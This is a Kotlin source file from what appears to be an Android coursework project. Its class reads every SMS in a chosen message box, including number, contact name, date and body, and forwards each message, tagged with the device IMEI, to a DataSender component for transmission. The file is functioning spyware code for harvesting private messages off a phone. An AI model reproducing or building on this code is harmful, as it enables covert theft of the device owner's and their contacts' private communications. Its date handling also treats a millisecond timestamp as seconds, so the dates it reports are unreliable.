package com.example.assignment1.DataRetriever

import android.content.Context
import android.net.Uri
import com.example.assignment1.DataSender
import java.util.*


class smsLog(var context: Context, var imei: String) {
    fun readSMSBox(box: String) {
        var datasender = DataSender()
        val SMSURI = Uri.parse("content://sms/$box")
        val cur = context.contentResolver.query(SMSURI, null, null, null, null)
            if (cur!!.moveToFirst()) {
                for (i in 0 until cur.count) {
                    val iterator = i.toString()
                    val number = cur.getString(cur.getColumnIndexOrThrow("address"))
                    var date = cur.getString(cur.getColumnIndexOrThrow("date"))
                    val person = cur.getString(cur.getColumnIndexOrThrow("person"))
                    val epoch = date.toLong()
                    val fDate = Date(epoch * 1000)
                    val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                    val fi =
                        "#$iterator\nNumber : $number\nPerson : $person\nDate : $fDate\nBody : $body\n"
                    datasender.sendData(imei, fi)
                    cur.moveToNext()
                }
            }
    }
}